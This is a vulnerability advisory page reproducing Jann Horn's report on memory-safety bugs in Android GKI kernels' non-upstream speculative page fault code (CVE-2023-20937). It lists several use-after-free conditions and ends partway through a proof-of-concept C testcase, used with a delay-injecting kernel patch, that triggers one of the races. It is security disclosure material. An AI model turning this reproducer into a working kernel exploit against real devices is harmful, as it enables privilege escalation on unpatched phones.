---
title: Android GKI Kernels Contain Broken Non-Upstream Speculative Page Faults MM Code
url: https://cxsecurity.com/issue/WLB-2023030013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-07
fetch_date: 2025-10-04T08:47:45.754797
---

# Android GKI Kernels Contain Broken Non-Upstream Speculative Page Faults MM Code

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Android GKI Kernels Contain Broken Non-Upstream Speculative Page Faults MM Code** **2023.03.06**  Credit:  **[Jann Horn](https://cxsecurity.com/author/Jann%2BHorn/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-20937](https://cxsecurity.com/cveshow/CVE-2023-20937/ "Click to see CVE-2023-20937")**  CWE: **N/A** | |

Android: GKI kernels contain broken non-upstream Speculative Page Faults MM code
A central recurring theme in Linux MM development is that contention on the
mmap lock can have a big negative performance impact on multithreaded workloads:
If one thread is holding the mmap lock in exclusive mode for an extended amount
of time, other threads will block as soon as they try to handle a page fault.
Therefore there is a bunch of work to downgrade exclusive lock holders to
non-exclusive lock holders, shrink critical sections, and avoid holding the lock
altogether in some cases.
One proposal to avoid holding the mmap lock in page fault handling are
\"Speculative page faults (SPF)\"; here's a patch series from 2019 that had already
gone through 11 rounds of review:
<https://lore.kernel.org/lkml/20190416134522.17540-1-ldufour@linux.ibm.com/t/>
This patch series didn't land at the time; but something along those lines might
land upstream in the next few years.
But for some reason, Android decided that they need speculative page faults
immediately, and merged the patches that were discussed on the upstream mailing
list into their GKI kernels. This is problematic for two reasons:
A) The MM code is complicated and easy to get wrong.
If you run MM code that has not been through the fuzzing, testing and review
that committed upstream code gets, there's a higher chance of undiscovered
bugs.
B) The SPF patches \*\*change the rules\*\* that MM code has to follow, so now
Android's version of MM has different rules than upstream MM.
This means that any patches in vaguely related parts of upstream MM need to
be checked by an Android engineer to see if they conflict with Android's
special rules.
As far as I can tell, there are a bunch of memory safety bugs in the SPF version
that is currently in AOSP's android13-5.10 branch (at commit 232bdcbd660b):
1. handle\_pte\_fault() calls pmd\_none() without protection against concurrent
page table deletion, leading to UAF read.
2. do\_anonymous\_page() calls pte\_alloc() without protection against concurrent
page table deletion, leading to UAF write.
3. do\_anonymous\_page() calls pmd\_trans\_unstable() without protection against
concurrent page table deletion, leading to UAF read.
4. do\_swap\_page() -> migration\_entry\_wait() -> \_\_migration\_entry\_wait() operates
on a page table without protection against concurrent page table deletion,
leading to use-after-union-change read+write in struct page (on the page
table lock) and use-after-free read of a page table entry (resulting in bogus
page\* calculation)
5. do\_wp\_page() calls handle\_userfault() without protection against concurrent
userfaultfd\_release(), leading to UAF reads of some flags from
userfaultfd\_ctx.
I think back when the SPF series was posted upstream, there might have been
sufficient protection against this (because \_\_\_handle\_speculative\_fault()
bails on VMAs with VM\_UFFD\_MISSING), but since then the WP userfaultfd
support was added, and \_\_\_handle\_speculative\_fault() doesn't bail on
VM\_UFFD\_WP. do\_wp\_page() also doesn't check the cached VMA flags, it uses
userfaultfd\_pte\_wp() which reads flags from the VMA.
6. The way seqcounts are used to detect concurrent writers looks wrong.
The seqcount API requires that only one writer at a time can be in a
vm\_write\_begin() / vm\_write\_end() section, but these helpers are used in
codepaths that only hold the mmap lock in shared mode, so there can be
concurrent writers.
As far as I can tell, this means that when there are an even number of
concurrent writers, it will look as if there are no active writers.
This \_probably\_ doesn't have much security impact because all of the places
that do vm\_write\_begin() where concurrency would be an actual problem seem to
hold the mmap lock in exclusive mode?
As an example, I tested issue 2. To reproduce this easily, I patched an extra
delay into the kernel:
```
diff --git a/mm/memory.c b/mm/memory.c
index 83b715ed65775..35ce412d0a965 100644
--- a/mm/memory.c
+++ b/mm/memory.c
@@ -84,6 +84,8 @@
#include <asm/tlb.h>
#include <asm/tlbflush.h>
+#include <linux/delay.h>
+
#include \"pgalloc-track.h\"
#include \"internal.h\"
@@ -3819,6 +3821,12 @@ static vm\_fault\_t do\_anonymous\_page(struct vm\_fault \*vmf)
vm\_fault\_t ret = 0;
pte\_t entry;
+ if (strcmp(current->comm, \"SLOWME\") == 0 && (vmf->flags & FAULT\_FLAG\_SPECULATIVE)) {
+ pr\_warn(\"%s: BEGIN DELAY 0x%lx\
\", \_\_func\_\_, vmf->address);
+ mdelay(2000);
+ pr\_warn(\"%s: END DELAY 0x%lx\
\", \_\_func\_\_, vmf->address);
+ }
+
/\* File mapping without ->vm\_ops ? \*/
if (vmf->vma\_flags & VM\_SHARED)
return VM\_FAULT\_SIGBUS;
```
Then, I ran this testcase on an x86 build with ASAN and CONFIG\_PREEMPT:
```
#define \_GNU\_SOURCE
#include <pthread.h>
#include <err.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
// basic idea:
// delete the 1G-covering page table while do\_anonymous\_page() is at its entry
// point
#define VMA\_ADDR ((void\*)0x40000000UL)
#define VMA\_SIZE (0x40000000UL)
#define SYSCHK(x) ({ \\
typeof(x) \_\_res = (x); \\
if (\_\_res == (typeof(x))-1) \\
err(1, \"SYSCHK(\" #x \")\"); \\
\_\_res; \\
})
static void \*thread\_fn(void \*dummy) {
SYSCHK(prctl(PR\_SET\_NAME, \"SLOWME\"));
\*(volatile char \*)VMA\_ADDR;
SYSCHK(prctl(PR\_SET\_NAME, \"spfthread\"));
}
int main(void) {
SYSCHK(mmap(VMA\_ADDR, VMA\_SIZE, PROT\_READ|PROT\_WRITE,
MAP\_ANONYMOUS|MAP\_PRIVATE|MAP\_FIXED\_NOREPLACE, -1, 0));
SYSCHK(madvise(VMA\_ADDR, VMA\_SIZE, MADV\_NOHUGEPAGE));
// create anon\_vma and page tables
\*(volatile char \*)(VMA\_ADDR+0x1000) = 1;
pthread\_t thread;
if (pthread\_create(&thread, NULL, thread\_fn, NULL))
errx(1, \"pthread\_create\");
sleep(1);
munmap(VMA\_ADDR, VMA\_SIZ...